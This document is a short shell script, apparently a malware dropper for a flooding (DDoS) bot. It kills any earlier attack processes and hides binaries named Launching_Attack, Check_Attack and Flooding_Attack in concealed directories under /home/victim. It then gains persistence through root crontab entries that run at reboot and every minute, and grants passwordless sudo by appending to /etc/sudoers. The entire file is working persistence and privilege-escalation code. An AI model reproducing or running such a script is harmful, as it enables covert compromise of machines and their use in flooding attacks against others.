#!/bin/sh

pgrep Flooding_Attack > /dev/null 2>&1 && kill $(pgrep Flooding_Attack) > /dev/null 2>&1
pgrep Check_Attack > /dev/null 2>&1 && kill $(pgrep Check_Attack) > /dev/null 2>&1
mkdir /home/victim/.Launch_Attack > /dev/null 2>&1
cp -f ./a /home/victim/.Launch_Attack/ > /dev/null 2>&1
mv -f /home/victim/.Launch_Attack/a /home/victim/.Launch_Attack/Launching_Attack > /dev/null 2>&1
mkdir /home/victim/.etc > /dev/null 2>&1
mkdir /home/victim/.etc_p > /dev/null 2>&1
mkdir /home/victim/.etc/.module > /dev/null 2>&1
mkdir /home/victim/.etc_p/.module > /dev/null 2>&1
cp -f /home/victim/.Launch_Attack/Launching_Attack /home/victim/.etc/.module/ > /dev/null 2>&1
cp -f /home/victim/.Launch_Attack/Launching_Attack /home/victim/.etc_p/.module/ > /dev/null 2>&1
cp -f ./c /home/victim/.etc/.module/ > /dev/null 2>&1
cp -f ./c /home/victim/.etc_p/.module/ > /dev/null 2>&1
mv -f /home/victim/.etc/.module/c /home/victim/.etc/.module/Check_Attack > /dev/null 2>&1 
mv -f /home/victim/.etc_p/.module/c /home/victim/.etc_p/.module/Check_Attack > /dev/null 2>&1 
cp -f ./b /home/victim/.etc/.module/ > /dev/null 2>&1
cp -f ./b /home/victim/.etc_p/.module/ > /dev/null 2>&1
mv -f /home/victim/.etc/.module/b /home/victim/.etc/.module/Flooding_Attack > /dev/null 2>&1
mv -f /home/victim/.etc_p/.module/b /home/victim/.etc_p/.module/Flooding_Attack > /dev/null 2>&1

grep -q @reboot /etc/crontab || echo '@reboot root ! pgrep Launching && cd /home/victim/.Launch_Attack && [ -f /home/victim/.Launch_Attack/Launching_Attack ] && ./Launching_Attack' >> /etc/crontab
grep "\* \* \* \* \*" /etc/crontab || echo '* * * * * root  ! pgrep Launching && cd /home/victim/.Launch_Attack && [ -f /home/victim/.Launch_Attack/Launching_Attack ] && ./Launching_Attack' >> /etc/crontab

systemctl restart cron > /dev/null 2>&1
grep -q "NOPASSWD" || echo "victim ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

/home/victim/.Launch_Attack/Launching_Attack


